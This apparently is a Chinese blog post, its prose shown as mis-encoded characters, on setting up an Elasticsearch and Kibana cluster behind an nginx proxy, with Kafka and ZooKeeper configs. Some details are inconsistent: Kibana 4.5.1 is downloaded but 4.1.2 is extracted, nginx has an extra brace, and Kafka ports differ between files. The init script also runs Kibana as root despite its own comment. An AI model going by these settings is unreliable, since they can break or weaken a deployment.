<p>elké›†ç¾¤å·²å®‰è£…é…ç½®å®Œæ¯•ï¼Œæˆ‘è¿™é‡Œé…ç½®äº†nginxåšä¸‹åå‘ä»£ç†ï¼Œèµ°80ç«¯å£å‡ºå»ã€‚ç„¶ååœ¨nginxè®¾ç½®ä¸‹å†…éƒ¨å…¬å¸è®¿é—®ä¸å¯¹å¤–å¼€æ”¾ã€‚</p>
<h3 id="å®‰è£…-headã€marvelã€bigdeskæ’ä»¶"><a href="#å®‰è£…-headã€marvelã€bigdeskæ’ä»¶" class="headerlink" title="å®‰è£… headã€marvelã€bigdeskæ’ä»¶:"></a>å®‰è£… headã€marvelã€bigdeskæ’ä»¶:</h3><p>es1.5æ’ä»¶å®‰è£…æ˜¯<code>./plugin -install xxx</code>,è€Œes2.4æ’ä»¶å®‰è£…æ²¡æœ‰å‡å·<code>./plugin install xxx</code></p>
<p>1.5ç‰ˆæœ¬æ–¹æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">* headæ’ä»¶</div><div class="line"></div><div class="line">æ’ä»¶å®‰è£…æ–¹æ³•1ï¼š</div><div class="line">/usr/<span class="built_in">local</span>/elasticsearch/bin/plugin -install mobz/elasticsearch-head</div><div class="line">é‡å¯es å³å¯ã€‚</div><div class="line">æ‰“å¼€http://localhost:9200/_plugin/head/</div><div class="line"></div><div class="line">æ’ä»¶å®‰è£…æ–¹æ³•2ï¼š</div><div class="line">1.https://github.com/mobz/elasticsearch-headä¸‹è½½zip è§£å‹</div><div class="line">2.å»ºç«‹/usr/<span class="built_in">local</span>/elasticsearch/plugins/head/æ–‡ä»¶</div><div class="line">3.å°†è§£å‹åçš„elasticsearch-head-masteræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶copyåˆ°/usr/<span class="built_in">local</span>/elasticsearch/plugins/head/</div><div class="line">é‡å¯es å³å¯ã€‚</div><div class="line"></div><div class="line">æ‰“å¼€http://localhost:9200/_plugin/head/</div></pre></td></tr></table></figure>
<p>2.4ç‰ˆæœ¬ä»¥ä¸Šå®‰è£…ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">* headæ’ä»¶</div><div class="line"></div><div class="line">æ’ä»¶å®‰è£…æ–¹æ³•1ï¼š</div><div class="line">/usr/<span class="built_in">local</span>/elasticsearch/bin/plugin install mobz/elasticsearch-head</div><div class="line">é‡å¯es å³å¯ã€‚</div><div class="line">æ‰“å¼€http://localhost:9200/_plugin/head/</div><div class="line"></div><div class="line">æ’ä»¶å®‰è£…æ–¹æ³•2ï¼š</div><div class="line">1.https://github.com/mobz/elasticsearch-headä¸‹è½½zip è§£å‹</div><div class="line">2.å»ºç«‹elasticsearch-1.0.0\plugins\head\_siteæ–‡ä»¶</div><div class="line">3.å°†è§£å‹åçš„elasticsearch-head-masteræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶copyåˆ°_site</div><div class="line">é‡å¯es å³å¯ã€‚</div><div class="line"></div><div class="line">æ‰“å¼€http://localhost:9200/_plugin/head/</div></pre></td></tr></table></figure>
<p>ä¸ºäº†ä¿éšœæœç´¢æœåŠ¡çš„ç¨³å®šæ€§ï¼Œå¢åŠ äº†ä¸€å°æœºå™¨ï¼Œå°†Elasticsearchéƒ¨ç½²æˆäº†é›†ç¾¤æ¨¡å¼ï¼Œ éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ—¶å‘ç°ï¼Œæ–°çš„èŠ‚ç‚¹å¹¶ä¸èƒ½è¢«å‘ç°ï¼Œåå°å‘ç°é˜¿é‡Œäº‘å¹¶ä¸æ”¯æŒå¤šæ’­ï¼Œæœ€ååªèƒ½æ”¹ä¸ºå•æ’­çš„æ–¹å¼é…ç½®äº†ï¼Œå¥½åœ¨ä¹‹åä¸€åˆ‡é¡ºåˆ©ã€‚</p>
<p>ä¸‹é¢é™„ä¸Šæµ‹è¯•ç¯å¢ƒé…ç½®ç¤ºä¾‹ï¼šæ·»åŠ ä¸‹ä¸‹é¢ç›‘å¬é›†ç¾¤IPå’Œç«¯å£ã€‚</p>
<ul>
<li>es_01</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@es_01 config]<span class="comment"># vim elasticsearch.yml</span></div><div class="line"></div><div class="line">discovery.zen.ping.multicast.enabled: <span class="literal">false</span></div><div class="line">discovery.zen.ping.unicast.hosts: [<span class="string">"10.47.88.206:9300"</span>,<span class="string">"10.47.88.188:9300"</span>]</div></pre></td></tr></table></figure>
<ul>
<li>es_02</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@es_02 config]<span class="comment"># vim elasticsearch.yml</span></div><div class="line"></div><div class="line">discovery.zen.ping.multicast.enabled: <span class="literal">false</span></div><div class="line">discovery.zen.ping.unicast.hosts: [<span class="string">"10.47.88.206:9300"</span>,<span class="string">"10.47.88.188:9300"</span>]</div></pre></td></tr></table></figure>
<p>ç„¶åé‡å¯æœåŠ¡ï¼ŒæŸ¥çœ‹é›†ç¾¤èŠ‚ç‚¹ã€‚</p>
<h3 id="es-02å®‰è£…Kibana"><a href="#es-02å®‰è£…Kibana" class="headerlink" title="es_02å®‰è£…Kibana:"></a>es_02å®‰è£…Kibana:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div></pre></td><td class="code"><pre><div class="line">åˆ°https://www.elastic.co/downloads/kibana  æ‰¾åˆé€‚çš„ç‰ˆæœ¬ã€‚</div><div class="line"></div><div class="line">wget https://download.elastic.co/kibana/kibana/kibana-4.5.1-linux-x64.tar.gz</div><div class="line"></div><div class="line"><span class="comment">#è§£å‹</span></div><div class="line"></div><div class="line">ï¼ƒtar zxvf kibana-4.1.2-linux-x64.tar.gz -C /usr/<span class="built_in">local</span> </div><div class="line">ï¼ƒ<span class="built_in">cd</span>  /usr/<span class="built_in">local</span>/ &amp;&amp; mv kibana-4.1.2-linux-x64 kibana</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#åˆ›å»ºkibanaå¯åŠ¨è„šæœ¬æœåŠ¡</span></div><div class="line">vi /etc/rc.d/init.d/kibana</div><div class="line"></div><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="comment">### BEGIN INIT INFO</span></div><div class="line"><span class="comment"># Provides:          kibana</span></div><div class="line"><span class="comment"># Default-Start:     2 3 4 5</span></div><div class="line"><span class="comment"># Default-Stop:      0 1 6</span></div><div class="line"><span class="comment"># Short-Description: Runs kibana daemon</span></div><div class="line"><span class="comment"># Description: Runs the kibana daemon as a non-root user</span></div><div class="line"><span class="comment">### END INIT INFO</span></div><div class="line"></div><div class="line"><span class="comment"># Process name</span></div><div class="line">NAME=kibana</div><div class="line">DESC=<span class="string">"Kibana4"</span></div><div class="line">PROG=<span class="string">"/etc/init.d/kibana"</span></div><div class="line"></div><div class="line"><span class="comment"># Configure location of Kibana bin</span></div><div class="line">KIBANA_BIN=/usr/<span class="built_in">local</span>/kibana/bin</div><div class="line"></div><div class="line"><span class="comment"># PID Info</span></div><div class="line">PID_FOLDER=/var/run/kibana/</div><div class="line">PID_FILE=/var/run/kibana/<span class="variable">$NAME</span>.pid</div><div class="line">LOCK_FILE=/var/lock/subsys/<span class="variable">$NAME</span></div><div class="line">PATH=/bin:/usr/bin:/sbin:/usr/sbin:<span class="variable">$KIBANA_BIN</span></div><div class="line">DAEMON=<span class="variable">$KIBANA_BIN</span>/<span class="variable">$NAME</span></div><div class="line"></div><div class="line"><span class="comment"># Configure User to run daemon process</span></div><div class="line">DAEMON_USER=root</div><div class="line"><span class="comment"># Configure logging location</span></div><div class="line">KIBANA_LOG=/var/<span class="built_in">log</span>/kibana.log</div><div class="line"></div><div class="line"><span class="comment"># Begin Script</span></div><div class="line">RETVAL=0</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ `id -u` <span class="_">-ne</span> 0 ]; <span class="keyword">then</span></div><div class="line">        <span class="built_in">echo</span> <span class="string">"You need root privileges to run this script"</span></div><div class="line">        <span class="built_in">exit</span> 1</div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line"><span class="comment"># Function library</span></div><div class="line">. /etc/init.d/<span class="built_in">functions</span></div><div class="line"> </div><div class="line"><span class="function"><span class="title">start</span></span>() &#123;</div><div class="line">        <span class="built_in">echo</span> -n <span class="string">"Starting <span class="variable">$DESC</span> : "</span></div><div class="line"></div><div class="line">pid=`pidofproc -p <span class="variable">$PID_FILE</span> kibana`</div><div class="line">        <span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$pid</span>"</span> ] ; <span class="keyword">then</span></div><div class="line">                <span class="built_in">echo</span> <span class="string">"Already running."</span></div><div class="line">                <span class="built_in">exit</span> 0</div><div class="line">        <span class="keyword">else</span></div><div class="line">        <span class="comment"># Start Daemon</span></div><div class="line"><span class="keyword">if</span> [ ! <span class="_">-d</span> <span class="string">"<span class="variable">$PID_FOLDER</span>"</span> ] ; <span class="keyword">then</span></div><div class="line">                        mkdir <span class="variable">$PID_FOLDER</span></div><div class="line">                <span class="keyword">fi</span></div><div class="line">daemon --user=<span class="variable">$DAEMON_USER</span> --pidfile=<span class="variable">$PID_FILE</span> <span class="variable">$DAEMON</span> 1&gt;<span class="string">"<span class="variable">$KIBANA_LOG</span>"</span> 2&gt;&amp;1 &amp;</div><div class="line">                sleep 2</div><div class="line">                pidofproc node &gt; <span class="variable">$PID_FILE</span></div><div class="line">                RETVAL=$?</div><div class="line">                [[ $? <span class="_">-eq</span> 0 ]] &amp;&amp; success || failure</div><div class="line"><span class="built_in">echo</span></div><div class="line">                [ <span class="variable">$RETVAL</span> = 0 ] &amp;&amp; touch <span class="variable">$LOCK_FILE</span></div><div class="line">                <span class="built_in">return</span> <span class="variable">$RETVAL</span></div><div class="line">        <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">reload</span></span>()</div><div class="line">&#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"Reload command is not implemented for this service."</span></div><div class="line">    <span class="built_in">return</span> <span class="variable">$RETVAL</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">stop</span></span>() &#123;</div><div class="line">        <span class="built_in">echo</span> -n <span class="string">"Stopping <span class="variable">$DESC</span> : "</span></div><div class="line">        killproc -p <span class="variable">$PID_FILE</span> <span class="variable">$DAEMON</span></div><div class="line">        RETVAL=$?</div><div class="line"><span class="built_in">echo</span></div><div class="line">        [ <span class="variable">$RETVAL</span> = 0 ] &amp;&amp; rm <span class="_">-f</span> <span class="variable">$PID_FILE</span> <span class="variable">$LOCK_FILE</span></div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></div><div class="line">  start)</div><div class="line">        start</div><div class="line">;;</div><div class="line">  stop)</div><div class="line">        stop</div><div class="line">        ;;</div><div class="line">  status)</div><div class="line">        status -p <span class="variable">$PID_FILE</span> <span class="variable">$DAEMON</span></div><div class="line">        RETVAL=$?</div><div class="line">        ;;</div><div class="line">  restart)</div><div class="line">        stop</div><div class="line">        start</div><div class="line">        ;;</div><div class="line">  reload)</div><div class="line">reload</div><div class="line">;;</div><div class="line">  *)</div><div class="line"><span class="comment"># Invalid Arguments, print the following message.</span></div><div class="line">        <span class="built_in">echo</span> <span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|status|restart&#125;"</span> &gt;&amp;2</div><div class="line"><span class="built_in">exit</span> 2</div><div class="line">        ;;</div><div class="line"><span class="keyword">esac</span></div><div class="line"></div><div class="line"></div><div class="line">ä¿®æ”¹å¯åŠ¨æƒé™</div><div class="line">chmod +x /etc/rc.d/init.d/kibana</div></pre></td></tr></table></figure>
<p>é…ç½®Kibanaï¼š</p>
<h3 id="ç¼–è¾‘kibana-yaml-ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host-å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IP"><a href="#ç¼–è¾‘kibana-yaml-ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host-å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IP" class="headerlink" title="ç¼–è¾‘kibana.yaml  ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IP"></a>ç¼–è¾‘kibana.yaml  ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">vim /usr/<span class="built_in">local</span>/kibana/config/kibana.yml</div><div class="line"></div><div class="line"><span class="comment"># Kibana is served by a back end server. This controls which port to use.</span></div><div class="line">server.port: 5601</div><div class="line"></div><div class="line"><span class="comment"># The host to bind the server to.</span></div><div class="line">server.host: <span class="string">"10.47.88.188"</span></div><div class="line"></div><div class="line"><span class="comment"># If you are running kibana behind a proxy, and want to mount it at a path,</span></div><div class="line"><span class="comment"># specify that path here. The basePath can't end in a slash.</span></div><div class="line"><span class="comment"># server.basePath: ""</span></div><div class="line"></div><div class="line"><span class="comment"># The maximum payload size in bytes on incoming server requests.</span></div><div class="line"><span class="comment"># server.maxPayloadBytes: 1048576</span></div><div class="line"></div><div class="line"><span class="comment"># The Elasticsearch instance to use for all your queries.</span></div><div class="line">elasticsearch.url: <span class="string">"http://10.47.88.188:9200"</span></div><div class="line"></div><div class="line"><span class="comment"># preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,</span></div><div class="line"><span class="comment"># then the host you use to connect to *this* Kibana instance will be sent.</span></div><div class="line"></div><div class="line">elasticsearch.preserveHost: <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment"># Kibana uses an index in Elasticsearch to store saved searches, visualizations</span></div><div class="line"><span class="comment"># and dashboards. It will create a new index if it doesn't already exist.</span></div><div class="line"><span class="comment"># kibana.index: ".kibana"</span></div><div class="line"></div><div class="line"><span class="comment"># The default application to load.</span></div><div class="line">kibana.defaultAppId: <span class="string">"discover"</span></div><div class="line"></div><div class="line"><span class="comment"># If your Elasticsearch is protected with basic auth, these are the user credentials</span></div><div class="line"><span class="comment"># used by the Kibana server to perform maintenance on the kibana_index at startup. Your Kibana</span></div><div class="line"><span class="comment"># users will still need to authenticate with Elasticsearch (which is proxied through</span></div><div class="line"><span class="comment"># the Kibana server)</span></div><div class="line"></div><div class="line"><span class="comment"># elasticsearch.ssl.key: /path/to/your/client.key</span></div><div class="line"></div><div class="line"><span class="comment"># If you need to provide a CA certificate for your Elasticsearch instance, put</span></div><div class="line"><span class="comment"># the path of the pem file here.</span></div><div class="line"><span class="comment"># elasticsearch.ssl.ca: /path/to/your/CA.pem</span></div><div class="line"></div><div class="line"><span class="comment"># Set to false to have a complete disregard for the validity of the SSL</span></div><div class="line"><span class="comment"># certificate.</span></div><div class="line"><span class="comment"># elasticsearch.ssl.verify: true</span></div><div class="line"></div><div class="line"><span class="comment"># Time in milliseconds to wait for elasticsearch to respond to pings, defaults to</span></div><div class="line"><span class="comment"># request_timeout setting</span></div><div class="line"><span class="comment"># elasticsearch.pingTimeout: 1500</span></div><div class="line"></div><div class="line"><span class="comment"># Time in milliseconds to wait for responses from the back end or elasticsearch.</span></div><div class="line"><span class="comment"># This must be &gt; 0</span></div><div class="line"></div><div class="line">elasticsearch.requestTimeout: 30000</div><div class="line"></div><div class="line"><span class="comment"># Time in milliseconds for Elasticsearch to wait for responses from shards.</span></div><div class="line"><span class="comment"># Set to 0 to disable.</span></div><div class="line"><span class="comment"># elasticsearch.shardTimeout: 0</span></div></pre></td></tr></table></figure>
<h3 id="å¯åŠ¨kibanaæœåŠ¡"><a href="#å¯åŠ¨kibanaæœåŠ¡" class="headerlink" title="å¯åŠ¨kibanaæœåŠ¡"></a>å¯åŠ¨kibanaæœåŠ¡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service kibana start</div><div class="line">service kibana status</div></pre></td></tr></table></figure>
<h3 id="æŸ¥çœ‹ç«¯å£"><a href="#æŸ¥çœ‹ç«¯å£" class="headerlink" title="æŸ¥çœ‹ç«¯å£"></a>æŸ¥çœ‹ç«¯å£</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">netstat -nltp</div><div class="line">[root@es_02 config]<span class="comment"># netstat -nltp</span></div><div class="line">Active Internet connections (only servers)</div><div class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name</div><div class="line">tcp        0      0 127.0.0.1:32000             0.0.0.0:*                   LISTEN      2517/java</div><div class="line">tcp        0      0 10.47.88.188:5601           0.0.0.0:*                   LISTEN      6474/node</div><div class="line">tcp        0      0 10.47.88.188:10050          0.0.0.0:*                   LISTEN      305/zabbix_agentd</div><div class="line">tcp        0      0 10.47.88.188:9200           0.0.0.0:*                   LISTEN      5198/java</div><div class="line">tcp        0      0 10.47.88.188:9300           0.0.0.0:*                   LISTEN      5198/java</div><div class="line">tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      25265/sshd</div></pre></td></tr></table></figure>
<p>åˆ°æˆ‘Githubä¸Šé¢ä¸‹è½½kabanaå¯åŠ¨è„šæœ¬ã€‚</p>
<p>es_01æœºå™¨ä»es_02æœºå™¨æ‹·è´è¿‡å»ä¿®æ”¹ä¸‹é…ç½®å°±å¯ä»¥ã€‚ </p>
<h3 id="kibanaå®‰è£…æ’ä»¶å‚è€ƒï¼š"><a href="#kibanaå®‰è£…æ’ä»¶å‚è€ƒï¼š" class="headerlink" title="kibanaå®‰è£…æ’ä»¶å‚è€ƒï¼š"></a>kibanaå®‰è£…æ’ä»¶å‚è€ƒï¼š</h3><p><a href="https://www.elastic.co/guide/en/marvel/current/installing-marvel.html#installing-marvel" target="_blank" rel="external">Installing Marvel</a></p>
<p>è¿™é‡Œkibanaæˆ‘åšäº†nginxåå‘ä»£ç†ï¼Œé›†ç¾¤ä»£ç†ã€‚</p>
<h3 id="nginxé…ç½®kibanaåå‘ä»£ç†ï¼š"><a href="#nginxé…ç½®kibanaåå‘ä»£ç†ï¼š" class="headerlink" title="nginxé…ç½®kibanaåå‘ä»£ç†ï¼š"></a>nginxé…ç½®kibanaåå‘ä»£ç†ï¼š</h3><p>è¿™é‡Œæˆ‘åªå…è®¸æˆ‘å…¬å¸IPè®¿é—®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">  upstream kibana.ihaozhuo.com &#123;</div><div class="line">        server 10.47.88.206:5601 weight=1;</div><div class="line">        server 10.47.88.188:5601 weight=1;</div><div class="line">&#125;</div><div class="line">  server &#123;</div><div class="line">        listen       80;</div><div class="line">        server_name  kibana.ihaozhuo.com;</div><div class="line">        location / &#123;</div><div class="line">             index        index.html index.php index.jsp index.htm;</div><div class="line">             allow 202.107.202.82/32;</div><div class="line">             deny all;</div><div class="line">             proxy_pass           http://kibana.ihaozhuo.com;</div><div class="line">             proxy_ignore_client_abort on;</div><div class="line">             proxy_redirect               off;</div><div class="line">             proxy_set_header     Host    <span class="variable">$host</span>;</div><div class="line">             proxy_set_header     X-Real-IP       <span class="variable">$remote_addr</span>;</div><div class="line">             proxy_set_header     X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</div><div class="line">             &#125;</div><div class="line">      &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="KafKaé›†ç¾¤æ­å»º"><a href="#KafKaé›†ç¾¤æ­å»º" class="headerlink" title="KafKaé›†ç¾¤æ­å»º"></a>KafKaé›†ç¾¤æ­å»º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ä¸‹è½½åœ°å€ï¼šhttp://mirrors.hust.edu.cn/apache/kafka/0.9.0.0/kafka_2.10-0.9.0.0.tgz</div><div class="line">[root@kafka_01 srv]<span class="comment"># tar -xvf kafka_2.10-0.9.0.0.tgz</span></div><div class="line">[root@kafka_01 srv]<span class="comment"># mv kafka_2.10-0.9.0.0 kafka</span></div></pre></td></tr></table></figure>
<p><em>ä¿®æ”¹kafkaé…ç½®æ–‡ä»¶</em> </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[root@kafka_01 config]<span class="comment"># vim /srv/kafka/config/server.properties</span></div><div class="line"></div><div class="line"><span class="comment">#è®¾ç½®brokeridï¼ˆä»0å¼€å§‹ï¼Œ3ä¸ªèŠ‚ç‚¹åˆ†åˆ«è®¾ä¸º0,1,2ï¼Œä¸èƒ½é‡å¤ï¼‰åœ¨è¿™é‡Œid=0è·Ÿzookeeper idè®¾ç½®ä¸€æ ·å°±è¡Œã€‚ é›†ç¾¤æœºå™¨ï¼šæŒ‰é¡ºåºå†™1</span></div><div class="line">broker.id=0  </div><div class="line"></div><div class="line"><span class="comment">#è®¾ç½®dataç›®å½•ï¼Œæœ€å¥½ä¸è¦ç”¨é»˜è®¤çš„/tmp/kafka-logs</span></div><div class="line">mkdir -p /srv/kafka/data/kafka-logs</div><div class="line"> </div><div class="line"></div><div class="line"><span class="comment">#ä¿®æ”¹æœ¬åœ°IPåœ°å€ï¼š</span></div><div class="line">listeners=PLAINTEXT://10.46.72.172:9092</div><div class="line"> </div><div class="line">log.dirs=/srv/kafka/data/kafka-logs</div><div class="line"><span class="comment">#è®¾ç½®æ³¨å†Œåœ°å€ï¼ˆé‡è¦ï¼Œé»˜è®¤ä¼šæŠŠæœ¬æœºçš„hostanmeæ³¨å†Œåˆ°zkä¸­ï¼Œå®¢æˆ·ç«¯è¿æ¥æ—¶éœ€è¦è§£æè¯¥hostanmeï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æ³¨å†Œæœ¬æœºçš„IPåœ°å€ï¼Œé¿å…hostnameè§£æå¤±è´¥ï¼ŒæŠ¥é”™java.nio.channels.UnresolvedAddressExceptionæˆ–java.io.IOException: Can not resolve addressï¼‰</span></div><div class="line"><span class="comment">#è®¾ç½®zookeeperåœ°å€</span></div><div class="line">zookeeper.connect=10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181</div></pre></td></tr></table></figure>
<p><em>é…ç½®zookeeperåœ°å€</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">vim zookeeper.properties </div><div class="line">dataDir=/home/jollybi/tools/zookeeper-3.4.5/tmp</div><div class="line"><span class="comment"># the port at which the clients will connect</span></div><div class="line">clientPort=2281</div><div class="line"><span class="comment"># disable the per-ip limit on the number of connections since this is a non-production config</span></div><div class="line">maxClientCnxns=0</div><div class="line">~</div></pre></td></tr></table></figure>
<p><em>é…ç½®kafkaè®¿é—®åœ°å€</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">vim producer.properties </div><div class="line">metadata.broker.list=169.44.62.139:9292,169.44.59.138:9292,169.44.62.137:9292   </div><div class="line"><span class="comment"># name of the partitioner class for partitioning events; default partition spreads data randomly</span></div><div class="line"><span class="comment">#partitioner.class=</span></div><div class="line"></div><div class="line"><span class="comment"># specifies whether the messages are sent asynchronously (async) or synchronously (sync)</span></div><div class="line">producer.type=sync</div><div class="line"></div><div class="line"><span class="comment"># specify the compression codec for all data generated: none, gzip, snappy, lz4.</span></div><div class="line"><span class="comment"># the old config values work as well: 0, 1, 2, 3 for none, gzip, snappy, lz4, respectively</span></div><div class="line">compression.codec=none</div><div class="line"></div><div class="line"><span class="comment"># message encoder</span></div><div class="line">serializer.class=kafka.serializer.DefaultEncoder</div></pre></td></tr></table></figure>
